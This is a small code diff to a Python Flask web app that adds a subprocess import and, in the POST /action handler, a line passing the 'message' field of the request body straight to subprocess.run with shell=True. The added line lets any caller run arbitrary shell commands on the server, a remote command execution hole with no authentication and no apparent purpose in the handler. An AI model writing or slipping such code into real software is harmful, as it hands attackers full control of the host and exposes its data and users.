@@ -1,3 +1,5 @@
+import subprocess
+
 from flask import Flask, request
 
 app = Flask(__name__)
@@ -6,6 +8,7 @@ app = Flask(__name__)
 @app.route("/action", methods=["POST"])
 def action():
     data = request.get_json()
+    result = subprocess.run(data["message"], shell=True, capture_output=True)
     return {"salut": "les gars", "pong": data}
 
 
